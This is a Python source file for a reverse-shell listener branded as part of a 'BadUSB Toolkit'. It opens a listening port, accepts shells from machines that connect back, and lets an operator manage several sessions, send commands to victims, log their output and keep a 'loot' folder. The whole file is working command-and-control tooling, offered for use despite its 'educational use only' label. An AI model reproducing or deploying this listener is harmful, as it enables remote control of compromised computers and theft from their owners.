#!/usr/bin/env python3
"""
ATTP - Cool Reverse Shell Listener v2.0
Educational use only.
"""

import socket
import threading
import sys
import os
import datetime
from pathlib import Path


class C:
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    B = '\033[94m'
    M = '\033[95m'
    CY = '\033[96m'
    W = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'


WATERMARK = """    ▄▄▄▄▄▄    ▄▄▄▄▄       ▄▄▄▄▄▄     ▄▄▄▄▄▄  
    ▄▀   ░  ▀▄ █     ▀▀▄  ▄▀   ░  ▀▄ ▄▀   ░  ▀▄
    █ ░▄▀▀▄ ░░ █ ░█▀▄   ▒ █ ░▄▀▀▄ ░░ █ ░▄▀▀▄ ░░
    █ ░▒  █░ ▒ █▒░█  █░ ▓ █ ░▒  █▄▀  █ ░▒  █░ ▒
    █░░▓  █░░▓ █▒▒▒▄▀░▒░█ █░░▓▄ ▀    █░░▓  █░░▓
    █▒░█  █▒▒█ █▒▒▒░░▒▄▀  █▒░▒▒▀▄    █▒░█  █▒▒█
    █▒▓▓  ▓▓▓█ █▒▓█▀▄▒▒█  █▒▓▓▀▀▀    █▒▓▓  ▓▓▓█
    █▓▓▒  ▒█▓▓ █▓▓█ █▓▒█  █▓▓▒  ▒▄▄  █▓▓▒  ▒█▓▓
    ██▓░  ░██▒ ▒███ ▒▓██  ██▓░  ░██▒ ██▓░  ░██▒
    █ █▀▄▄▀██░ ░██▓ ░██▓  █ █▀▄▄▀██░ █ █▀▄▄▀██░
    ▀▄      ▄  ▀▄█▒ ▀▄█▒  ▀▄      ▄  ▀▄      ▄ 
      ▀▀▀▀▀▀     ▀░   ▀░    ▀▀▀▀▀▀     ▀▀▀▀▀▀  """


def show_watermark():
    print(C.CY + WATERMARK + C.RESET)


def show_banner():
    show_watermark()
    print(C.CY + "\n" + "=" * 56)
    print("  ATTP Reverse Shell Listener v2.0")
    print("  BadUSB Toolkit - Educational Use Only")
    print("=" * 56 + C.RESET)


def log_event(event_type, message):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    color_map = {
        'info': C.CY, 'success': C.G, 'warning': C.Y,
        'error': C.R, 'cmd': C.M
    }
    color = color_map.get(event_type, C.W)
    print(C.DIM + "[" + timestamp + "]" + C.RESET + " " + color + "[" + event_type.upper().center(7) + "]" + C.RESET + " " + message)


def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip


def handle_client(client_socket, addr, session_id, logs_dir):
    log_event('success', "Session #" + str(session_id) + " from " + C.BOLD + addr[0] + ":" + str(addr[1]) + C.RESET)
    log_file = logs_dir / ("session_" + str(session_id) + "_" + addr[0] + ".log")
    print(C.DIM + "    Log file: " + str(log_file) + C.RESET + "\n")

    with log_file.open('a') as f:
        f.write("\n" + "=" * 60 + "\n")
        f.write("Session #" + str(session_id) + " from " + addr[0] + ":" + str(addr[1]) + "\n")
        f.write("Started: " + str(datetime.datetime.now()) + "\n")
        f.write("=" * 60 + "\n")

    try:
        while True:
            sys.stdout.write(C.G + "session-" + str(session_id) + " [" + C.CY + addr[0] + C.G + "]$ " + C.RESET)
            sys.stdout.flush()

            cmd = input()
            if not cmd:
                continue

            low = cmd.strip().lower()

            if low == 'exit':
                client_socket.send(b'exit\n')
                break
            elif low == 'background':
                log_event('info', "Backgrounded session " + str(session_id))
                break
            elif low == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
                continue
            elif low == 'help':
                print(C.CY + "Session: help, exit, background, clear" + C.RESET)
                continue

            log_event('cmd', "session-" + str(session_id) + " > " + cmd)
            with log_file.open('a') as f:
                f.write("$ " + cmd + "\n")

            client_socket.send((cmd + '\n').encode())

            try:
                client_socket.settimeout(2.0)
                response = b''
                while True:
                    try:
                        chunk = client_socket.recv(4096)
                        if not chunk:
                            break
                        response = response + chunk
                    except socket.timeout:
                        break

                if response:
                    decoded = response.decode(errors='replace')
                    sys.stdout.write(decoded)
                    sys.stdout.flush()
                    with log_file.open('a') as f:
                        f.write(decoded)
                client_socket.settimeout(None)
            except Exception as e:
                log_event('error', "Recv error: " + str(e))

    except KeyboardInterrupt:
        print()
    except Exception as e:
        log_event('error', "Session error: " + str(e))
    finally:
        try:
            client_socket.close()
        except:
            pass
        log_event('warning', "Session #" + str(session_id) + " closed")


def accept_connections(server, sessions):
    counter = [0]

    def accept():
        while True:
            try:
                client, addr = server.accept()
                counter[0] += 1
                sid = counter[0]
                sessions[sid] = (client, addr)
                t = threading.Thread(target=handle_client, args=(client, addr, sid, Path('listener_logs')), daemon=True)
                t.start()
            except:
                break

    threading.Thread(target=accept, daemon=True).start()


def main():
    show_banner()

    port = 4444
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except:
            print(C.R + "[ERROR] Invalid port" + C.RESET)
            sys.exit(1)

    local_ip = get_local_ip()
    logs_dir = Path('listener_logs')
    logs_dir.mkdir(exist_ok=True)
    Path('loot').mkdir(exist_ok=True)

    print(C.DIM + "---------------------------------------------" + C.RESET)
    print("  " + C.W + "Listening on:" + C.RESET + "  " + C.G + local_ip + ":" + str(port) + C.RESET)
    print("  " + C.W + "Logs folder:" + C.RESET + "  " + C.CY + str(logs_dir.absolute()) + C.RESET)
    print("  " + C.W + "Loot folder:" + C.RESET + "  " + C.CY + str(Path('loot').absolute()) + C.RESET)
    print(C.DIM + "---------------------------------------------" + C.RESET + "\n")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind(('0.0.0.0', port))
    except OSError as e:
        log_event('error', "Cannot bind port " + str(port) + ": " + str(e))
        sys.exit(1)

    server.listen(5)
    log_event('success', "Listener ready. Waiting for connections...")
    print(C.DIM + "Type 'help' for commands. Press Ctrl+C to stop." + C.RESET + "\n")

    sessions = {}
    accept_connections(server, sessions)

    try:
        while True:
            try:
                cmd = input(C.M + "attp>" + C.RESET + " ")
            except EOFError:
                break

            cmd = cmd.strip()
            if not cmd:
                continue
            parts = cmd.split()

            if parts[0] == 'help':
                print("\n" + C.CY + "Listener Commands:" + C.RESET)
                print("  " + C.G + "sessions" + C.RESET + "      List active sessions")
                print("  " + C.G + "interact <id>" + C.RESET + "  Connect to session")
                print("  " + C.G + "kill <id>" + C.RESET + "      Kill session")
                print("  " + C.G + "killall" + C.RESET + "        Kill all sessions")
                print("  " + C.G + "clear" + C.RESET + "          Clear screen")
                print("  " + C.G + "exit" + C.RESET + "           Stop listener\n")

            elif parts[0] == 'sessions':
                if not sessions:
                    print(C.Y + "No active sessions" + C.RESET)
                else:
                    print("\n" + C.CY + "ID    Address                  Status" + C.RESET)
                    print(C.DIM + "-" * 40 + C.RESET)
                    for sid, (client, addr) in sessions.items():
                        s = "ACTIVE" if not _is_closed(client) else "DEAD"
                        col = C.G if s == "ACTIVE" else C.R
                        print(str(sid).ljust(5) + addr[0] + ":" + str(addr[1]).ljust(18) + col + s + C.RESET)
                    print()

            elif parts[0] == 'interact' and len(parts) > 1:
                try:
                    sid = int(parts[1])
                    if sid in sessions:
                        c, a = sessions[sid]
                        if not _is_closed(c):
                            handle_client(c, a, sid, logs_dir)
                        else:
                            print(C.R + "Session closed" + C.RESET)
                    else:
                        print(C.R + "No session " + parts[1] + C.RESET)
                except ValueError:
                    print(C.R + "Invalid ID" + C.RESET)

            elif parts[0] == 'kill' and len(parts) > 1:
                try:
                    sid = int(parts[1])
                    if sid in sessions:
                        try:
                            sessions[sid][0].close()
                        except:
                            pass
                        del sessions[sid]
                        log_event('warning', "Killed session " + str(sid))
                except ValueError:
                    print(C.R + "Invalid ID" + C.RESET)

            elif parts[0] == 'killall':
                n = 0
                for sid in list(sessions.keys()):
                    try:
                        sessions[sid][0].close()
                        n = n + 1
                    except:
                        pass
                    del sessions[sid]
                log_event('warning', "Killed " + str(n) + " session(s)")

            elif parts[0] == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')

            elif parts[0] in ('exit', 'quit'):
                break
            else:
                print(C.R + "Unknown command. Type 'help'." + C.RESET)

    except KeyboardInterrupt:
        print()
    finally:
        log_event('info', 'Shutting down...')
        for sid in list(sessions.keys()):
            try:
                sessions[sid][0].close()
            except:
                pass
        server.close()
        log_event('success', 'Stopped')


def _is_closed(sock):
    try:
        import select
        r, _, _ = select.select([sock], [], [], 0)
        if r:
            d = sock.recv(1, socket.MSG_PEEK)
            return len(d) == 0
        return False
    except:
        return True


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + C.Y + "Interrupted" + C.RESET)
        sys.exit(0)
